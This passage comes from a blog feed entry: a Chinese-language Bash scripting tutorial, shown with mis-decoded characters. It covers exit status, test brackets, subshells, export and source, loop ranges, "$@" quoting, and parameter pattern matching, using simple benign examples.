href="#é€€å‡ºç‹€æ…‹" class="headerlink" title="é€€å‡ºç‹€æ…‹"></a>é€€å‡ºç‹€æ…‹</h3><ul><li>é€€å‡ºç‹€æ…‹ç‚º 0 ä»£è¡¨æˆåŠŸï¼Œé 0 ä»£è¡¨å¤±æ•—</li><li>é€™å€‹é€€å‡ºç‹€æ…‹ä¸¦ä¸æ˜¯å›å‚³å€¼ï¼ˆé€™é‚Šè·Ÿ C èªè¨€ä¸å¤ªä¸€æ¨£ï¼‰</li><li>å¯ä»¥ç”¨ <code>$?</code> æŸ¥çœ‹ä¸Šä¸€å€‹æŒ‡ä»¤çš„é€€å‡ºç‹€æ…‹</li></ul><h3 id="test-æŒ‡ä»¤"><a href="#test-æŒ‡ä»¤" class="headerlink" title="test æŒ‡ä»¤"></a>test æŒ‡ä»¤</h3><ul><li>åœ¨ if å¥ä¸­å¯ä»¥ç”¨ [] ä¾†å–ä»£ test å…©è€…ä¸¦ç„¡å·®åˆ¥ï¼š</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -e a;<span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"yes"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -e a ];<span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"yes"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></tbody></table></figure><p>ä¸Šè¿°å…©ç¨®å¯«æ³•æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œ[] ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ Shell ä¸­ä½¿ç”¨ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ a = a ]</span><br><span class="line"><span class="built_in">echo</span> $?   <span class="comment"># 0</span></span><br></pre></td></tr></tbody></table></figure><ul><li>æœ‰å€‹æŒ‡ä»¤ exit ä¹Ÿå¯ä»¥è‡ªè¡Œè¨­å®šé€€å‡ºç‹€æ…‹ï¼Œè‹¥æ²’æœ‰æŒ‡å®šï¼Œå‰‡æœƒä½¿ç”¨ä¸Šä¸€å€‹æŒ‡ä»¤çš„é€€å‡ºç‹€æ…‹ç•¶ä½œé€€å‡ºç‹€æ…‹ï¼Œå³ <code>exit $?</code></li></ul><h3 id="Shell-Script-ä¹Ÿå¯ä»¥-debug"><a href="#Shell-Script-ä¹Ÿå¯ä»¥-debug" class="headerlink" title="Shell Script ä¹Ÿå¯ä»¥ debug"></a>Shell Script ä¹Ÿå¯ä»¥ debug</h3><ul><li>-v åƒæ•¸å¯ä»¥å…ˆå°å‡º script å…§å®¹ï¼Œåœ¨åŸ·è¡Œ shell</li><li>-x åƒæ•¸å¯ä»¥ debugï¼Œæœƒé€è¡ŒæŒ‡ç¤ºéç¨‹</li></ul><h3 id="ç©ºå‘½ä»¤ï¼š"><a href="#ç©ºå‘½ä»¤ï¼š" class="headerlink" title="ç©ºå‘½ä»¤ï¼š"></a>ç©ºå‘½ä»¤ï¼š</h3><p>åœ¨ if ï¼ˆæˆ–æ˜¯ else, elifï¼‰ä¸­è‹¥æ²’æœ‰å…§å®¹éœ€è¦åŸ·è¡Œï¼Œéœ€è¦åŠ ä¸€å€‹ç©ºå‘½ä»¤ <code>ï¼š</code>ï¼Œå¦å‰‡æœƒå ±éŒ¯èª¤ï¼ˆé¡ä¼¼ Python ä¸­çš„ passã€‚ï¼‰ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -e a;<span class="keyword">then</span></span><br><span class="line">    :</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"no"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></tbody></table></figure><h3 id="amp-amp-èˆ‡"><a href="#amp-amp-èˆ‡" class="headerlink" title="&& èˆ‡ ||"></a>&& èˆ‡ ||</h3><ul><li>åœ¨å–®è¡ŒæŒ‡ä»¤ä¸­ä½¿ç”¨ if ä¸¦ä¸ç›´è¦ºï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨ && èˆ‡ || ä¾†å¼·åŒ–æˆ‘å€‘çš„æŒ‡ä»¤</li><li>A && B : ç•¶ A æŒ‡ä»¤æˆåŠŸå‰‡åŸ·è¡Œ B æŒ‡ä»¤ï¼ˆA çš„é€€å‡ºç‹€æ…‹ä¸ç‚º 0 æ™‚å‰‡ä¸åŸ·è¡Œ Bï¼‰</li><li>A || B : ç•¶ A æŒ‡ä»¤åŸ·è¡Œå¤±æ•—æ™‚ï¼Œæ‰åŸ·è¡Œ B</li></ul><p>ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -irn <span class="string">"target_str"</span> dic.txt || <span class="built_in">echo</span> <span class="string">"Couldn't not find"</span></span><br></pre></td></tr></tbody></table></figure><p>åƒ…æœ‰åœ¨ grep æœªæœå°‹åˆ°å…§å®¹æ™‚ï¼Œæ‰æœƒå°å‡º Couldnâ€™t not findã€‚</p><h2 id="è¿´åœˆ"><a href="#è¿´åœˆ" class="headerlink" title="è¿´åœˆ"></a>è¿´åœˆ</h2><h3 id="èˆ‡"><a href="#èˆ‡" class="headerlink" title="$* èˆ‡ $@"></a>$* èˆ‡ $@</h3><p>æˆ‘å€‘æœ‰æ™‚å€™æœƒé€é <code>$*</code> å–å¾—å…¨éƒ¨çš„åƒæ•¸ä¸¦ä¸”ä½¿ç”¨è¿´åœˆè¿­ä»£ï¼Œä½†å¦‚æœæˆ‘å€‘çš„åƒæ•¸ä¸­æ˜¯ <code>a b 'c d'</code> ä¸‰å€‹åƒæ•¸ï¼Œæœƒå› ç‚º <code>$*</code> æ˜¯æŠŠ $1, $2, â€¦ å–å‡ºä¾†ï¼Œæœ€å¾Œè®Šæˆ a b c d ä¸Ÿçµ¦è¿´åœˆè¿­ä»£ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> $*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$arg</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><p>ä»¥ä¸Šçš„ç¨‹å¼ç¢¼æœƒå°å‡º</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br></pre></td></tr></tbody></table></figure><p>æ­¤æ™‚æˆ‘å€‘å¯ä»¥ç”¨ <code>"$@"</code> ä¾†æ”¹å–„ï¼Œshell æœƒå°‡å…¶æ›¿æ›ç‚º â€œ$1â€, â€œ$2â€ â€¦</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> <span class="string">"<span class="variable">$@</span>"</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$arg</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><p>ä»¥ä¸Šçš„ç¨‹å¼ç¢¼æœƒå°å‡ºï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line">c d</span><br></pre></td></tr></tbody></table></figure><p>åˆ‡è¨˜ï¼è‹¥ â€œ$@â€ æ²’æœ‰åŠ ä¸Šé›™å¼•è™Ÿï¼Œé‚£éº¼ $@ ä»¥åŠ $* çš„çµæœæ˜¯ä¸€æ¨£çš„ã€‚</p><h3 id="break-n"><a href="#break-n" class="headerlink" title="break n"></a>break n</h3><ul><li>Shell çš„ break å¯ä»¥ä¸€æ¬¡è·³å‡ºä¸æ­¢ä¸€å±¤è¿´åœˆï¼Œåœ¨ break n æŒ‡å®šå³å¯</li><li>è‹¥æ²’æœ‰æŒ‡å®š n å³è·³å‡ºä¸€å±¤è¿´åœˆ</li></ul><h3 id="è¿´åœˆæ¬¡æ•¸çš„å¹¾ç¨®æŒ‡å®šæ–¹å¼"><a href="#è¿´åœˆæ¬¡æ•¸çš„å¹¾ç¨®æŒ‡å®šæ–¹å¼" class="headerlink" title="è¿´åœˆæ¬¡æ•¸çš„å¹¾ç¨®æŒ‡å®šæ–¹å¼"></a>è¿´åœˆæ¬¡æ•¸çš„å¹¾ç¨®æŒ‡å®šæ–¹å¼</h3><ul><li>$(seq minimum maximum)</li><li>{minimum..maximum}</li><li>{minimum..maximum..step}</li><li>(( EXP1; EXP2; EXP3 ))</li></ul><h2 id="è®€å¯«è³‡æ–™"><a href="#è®€å¯«è³‡æ–™" class="headerlink" title="è®€å¯«è³‡æ–™"></a>è®€å¯«è³‡æ–™</h2><h3 id="è®Šæ•¸-1"><a href="#è®Šæ•¸-1" class="headerlink" title="$$ è®Šæ•¸"></a>$$ è®Šæ•¸</h3><p><code>$$</code> è®Šæ•¸ç”¨ä¾†é¡¯ç¤ºç•¶å‰ PIDã€‚</p><p>å¯« script æ™‚å¯èƒ½æœƒç”¢ç”Ÿä¸€äº›æš«å­˜æª”ï¼Œå¦‚æœå¤§å®¶éƒ½åŒæ™‚åœ¨ç”¨é€™æ”¯ scriptï¼Œé‚£éº¼ race condition å¯èƒ½æœƒç™¼ç”Ÿã€‚è¦é¿å…çš„æ–¹å¼å°±æ˜¯è®“æ¯ä¸€æ¬¡åŸ·è¡Œæ‰€ç”¢ç”Ÿçš„æš«å­˜æª”åç¨±éƒ½ä¸ä¸€æ¨£ï¼Œé‚£éº¼ä½¿ç”¨ <code>$$</code> è®Šæ•¸å°±æœƒæ˜¯ä¸€å€‹å¥½æ–¹æ³•ã€‚</p><p>ç”¢ç”Ÿæš«å­˜æª”è¼ƒå¥½çš„æ–¹å¼ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"This is tmp file"</span> > /tmp/tmpfile_$$</span><br></pre></td></tr></tbody></table></figure><h2 id="ç’°å¢ƒ"><a href="#ç’°å¢ƒ" class="headerlink" title="ç’°å¢ƒ"></a>ç’°å¢ƒ</h2><h3 id="å€åŸŸè®Šæ•¸"><a href="#å€åŸŸè®Šæ•¸" class="headerlink" title="å€åŸŸè®Šæ•¸"></a>å€åŸŸè®Šæ•¸</h3><p>åœ¨ Shell çš„ç’°å¢ƒä¸­ï¼Œæ¯åŸ·è¡Œä¸€æ”¯ script éƒ½æœƒç”¢ç”Ÿä¸€å€‹å±¬æ–¼è©² script è‡ªå·±çš„ç©ºé–“ï¼ˆå¯ä»¥æƒ³æˆæ˜¯ç”¢ç”Ÿä¸€å€‹æ–°çš„ processï¼‰ï¼Œè©²ç©ºé–“èˆ‡å¤–ç•Œäº’ä¸å¹²æ“¾ï¼š</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â˜ cat s.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">echo $x</span><br><span class="line">â˜ x=100</span><br><span class="line">â˜ ./s.sh</span><br><span class="line"></span><br><span class="line">â˜ echo $x</span><br><span class="line">100</span><br></pre></td></tr></tbody></table></figure><p><code>s.sh</code> è…³æœ¬çœ‹ä¸åˆ°å¤–ç•Œçš„è®Šæ•¸ï¼Œå¤–ç•Œä¹Ÿçœ‹ä¸åˆ°å®ƒçš„è®Šæ•¸ã€‚</p><h3 id="è¼¸å‡ºè®Šæ•¸"><a href="#è¼¸å‡ºè®Šæ•¸" class="headerlink" title="è¼¸å‡ºè®Šæ•¸"></a>è¼¸å‡ºè®Šæ•¸</h3><p>æ‰¿ä¸Šè¿°ï¼Œå¦‚æœæˆ‘å€‘æƒ³è¦å°‡ç›®å‰çš„è®Šæ•¸èˆ‡ <code>å­ Shell</code> å…±äº«æ™‚ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨ <code>export</code> æŒ‡ä»¤</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â˜ export x</span><br><span class="line">â˜ ./s.sh</span><br><span class="line">100</span><br></pre></td></tr></tbody></table></figure><ul><li>export -p ï¼šæŸ¥çœ‹ç›®å‰ export çš„è®Šæ•¸åˆ—è¡¨</li></ul><h3 id="ç›®éŒ„ä»¥åŠç’°å¢ƒ"><a href="#ç›®éŒ„ä»¥åŠç’°å¢ƒ" class="headerlink" title="ç›®éŒ„ä»¥åŠç’°å¢ƒ"></a>ç›®éŒ„ä»¥åŠç’°å¢ƒ</h3><p>æœ‰äº† <code>å­ Shell</code> çš„æ¦‚å¿µå¾Œï¼Œä¸é›£ç†è§£åœ¨ script ä¸­è®Šæ›ç›®éŒ„å°æ–¼å¤–ç•Œçš„ Shell ä¾†èªªæ˜¯æ²’æœ‰å½±éŸ¿åŠ›çš„ï¼Œå› ç‚ºå½¼æ­¤ä¹‹é–“æ“æœ‰ç¨ç«‹çš„ç©ºé–“ã€‚</p><p>é‚£å¦‚æœæƒ³è¦å…±äº«ç’°å¢ƒï¼Œç”¨ç•¶å‰çš„ Shell å»åŸ·è¡Œ script æ™‚å‘¢ï¼Ÿ</p><p><code>.</code> æŒ‡ä»¤æä¾›äº†é€™ä»¶äº‹ï¼ˆå…¶å¯¦å°±æ˜¯ source æŒ‡ä»¤ï¼‰ã€‚</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">03:11:58 yiyu@afra shell â†’ pwd</span><br><span class="line">/Users/yiyu/dev/tmp/shell</span><br><span class="line"></span><br><span class="line">03:12:02 yiyu@afra shell â†’ cat s.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">cd ..</span><br><span class="line">ï¼ˆç›®éŒ„ä¸¦æ²’æœ‰è¢«åˆ‡æ›ï¼‰</span><br><span class="line">03:14:39 yiyu@afra shell â†’ ./s.sh</span><br><span class="line">03:14:58 yiyu@afra shell â†’ pwd</span><br><span class="line">/Users/yiyu/dev/tmp/shell</span><br><span class="line">ï¼ˆä½¿ç”¨ . æŒ‡ä»¤ï¼‰</span><br><span class="line">03:15:43 yiyu@afra shell â†’ . s.sh</span><br><span class="line">03:15:58 yiyu@afra shell â†’ pwd</span><br><span class="line">/Users/yiyu/dev/tmp/</span><br><span class="line">ï¼ˆç›®éŒ„è¢«åˆ‡æ›äº†ï¼‰</span><br><span class="line">03:16:54 yiyu@afra tmp â†’ cd shell</span><br><span class="line">/Users/yiyu/dev/tmp/shell</span><br><span class="line">ï¼ˆä½¿ç”¨ source æŒ‡ä»¤ï¼‰</span><br><span class="line">03:17:49 yiyu@afra shell â†’ source s.sh</span><br><span class="line">03:17:58 yiyu@afra shell â†’ pwd</span><br><span class="line">/Users/yiyu/dev/tmp/</span><br><span class="line">ï¼ˆç›®éŒ„è¢«åˆ‡æ›äº†ï¼‰</span><br></pre></td></tr></tbody></table></figure><h3 id="èˆ‡-1"><a href="#èˆ‡-1" class="headerlink" title="() èˆ‡ {}"></a>() èˆ‡ {}</h3><p>é€™å…©ç¨®åŒ…è£¹æŒ‡ä»¤çš„æ–¹å¼å¯ä»¥è®“æŒ‡ä»¤ä¸€å€‹æ¥è‘—ä¸€å€‹åŸ·è¡Œä¸‹å»ï¼Œå·®ç•°åœ¨æ–¼å‰è€…æ˜¯åœ¨å­ shell ä¸­åŸ·è¡Œï¼Œå¾Œè€…æ˜¯åœ¨ç•¶å‰ shell ä¸­åŸ·è¡Œã€‚</p><ul><li>()ï¼šç”¢ç”Ÿæ–°çš„ Shell ç’°å¢ƒä¾†åŸ·è¡Œ</li></ul><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">03:27:54 yiyu@afra shell â†’ pwd</span><br><span class="line">/Users/yiyu/dev/tmp/shell</span><br><span class="line">03:27:58 yiyu@afra shell â†’ (cd ..)</span><br><span class="line">03:28:28 yiyu@afra shell â†’ pwd</span><br><span class="line">/Users/yiyu/dev/tmp/shell</span><br></pre></td></tr></tbody></table></figure><ul><li>{}ï¼šä½¿ç”¨ç•¶å‰ç’°å¢ƒåŸ·è¡Œã€‚åˆ‡è¨˜ï¼ŒæŒ‡ä»¤å‰å¾Œå¿…é ˆè¦ç©ºæ ¼ï¼Œæœ€å¾Œä¸€å€‹æŒ‡ä»¤å¾Œé¢å¿…é ˆè¦æœ‰åˆ†è™Ÿ</li></ul><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">03:28:29 yiyu@afra shell â†’ pwd</span><br><span class="line">/Users/yiyu/dev/tmp/shell</span><br><span class="line">03:29:23 yiyu@afra shell â†’ { cd ..; pwd; }</span><br><span class="line">/Users/yiyu/dev/tmp</span><br></pre></td></tr></tbody></table></figure><h2 id="å†è«–åƒæ•¸"><a href="#å†è«–åƒæ•¸" class="headerlink" title="å†è«–åƒæ•¸"></a>å†è«–åƒæ•¸</h2><h3 id="å­—ä¸²æ ¼å¼"><a href="#å­—ä¸²æ ¼å¼" class="headerlink" title="å­—ä¸²æ ¼å¼"></a>å­—ä¸²æ ¼å¼</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">${#string}</span><br></pre></td></tr></tbody></table></figure><p>å¯ä»¥ç”¨ä¾†è¨ˆç®—å­—ä¸²ï¼Œéå¸¸å¯¦ç”¨</p><ul><li>$0 å¯ä»¥ç”¨ä¾†é¡¯ç¤ºç•¶å‰çš„ç¨‹å¼åç¨±ï¼Œæ™‚å¸¸è¢«ç”¨ä¾†é¡¯ç¤ºç•¶å‰ Shell ç‚ºä½•</li></ul><h3 id="æ¨£å¼é…å°çµæ§‹"><a href="#æ¨£å¼é…å°çµæ§‹" class="headerlink" title="æ¨£å¼é…å°çµæ§‹"></a>æ¨£å¼é…å°çµæ§‹</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var=hel___lo~</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">${var#*l}</span> <span class="comment"># åˆªé™¤å·¦å´æœ€çŸ­é…å° # ___lo~</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">${var##*l}</span> <span class="comment"># åˆªé™¤å·¦å´æœ€çŸ­é•·é…å° # o~</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœæƒ³è¦æ”¹ç‚ºåˆªé™¤å³å´ï¼Œå°‡ # æ›¿æ›ç‚º %</span></span><br><span class="line">path=/Users/yy/dev</span><br><span class="line">basename path <span class="comment"># Unix çš„ basename æŒ‡ä»¤ã€‚è¼¸å‡ºï¼šdev</span></span><br><span class="line"><span class="comment"># æˆ‘å€‘å¯ä»¥ç”¨æ¨£å¼é…å°çµæ§‹ä¾†æ”¹å¯«</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">${path##*/}</span> <span class="comment"># åˆªé™¤å¾å·¦é‚Šé…å°è‡³æœ€å¾Œä¸€å€‹ / ï¼Œå³å¯ä»¥é”æˆ basename æŒ‡ä»¤ä¹‹è¼¸å‡º</span></span><br></pre></td></tr></tbody></table></figure><h1 id="å¾Œè¨˜"><a href="#å¾Œè¨˜" class="headerlink" title="å¾Œè¨˜"></a>å¾Œè¨˜</h1><p>ç†Ÿæ‚‰ Shell çš„ä¸€äº›çŸ¥è­˜èˆ‡æ¦‚å¿µä¹‹å¾Œï¼Œå¯« script æ™‚ä¸ä½†èƒ½ç”¨è¼ƒç‚ºå„ªé›…çš„æ–¹å¼ä¾†æ’°å¯«ï¼Œä¹Ÿèƒ½å¢åŠ  script çš„éˆæ´»åº¦ã€‚å°æ–¼ç¾åœ¨ CI/CD æµè¡Œçš„æ™‚ä»£ï¼ŒShell å¹¾ä¹æ˜¯ä¸å¯æˆ–ç¼ºçš„æŠ€è¡“ä¹‹ä¸€ã€‚é€™ç¯‡æ–‡ç« é™¤äº†æä¾›è‡ªå·±åœ¨æ—¥å¾Œå¯ä»¥å¿«é€Ÿæ–¹ä¾¿çš„æŸ¥é–±ä»¥å¤–ï¼Œä¹Ÿæä¾›æœ‰ä½¿ç”¨é Shell ä½†æ˜¯ä¸€ç›´æ²’æœ‰æ·±å…¥äº†è§£éçš„å„ä½æœ‹å‹å€‘ï¼</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="shell" scheme="https://blog.yiyu0x.org/tags/shell/"/>
    
  </entry>
  
</feed>
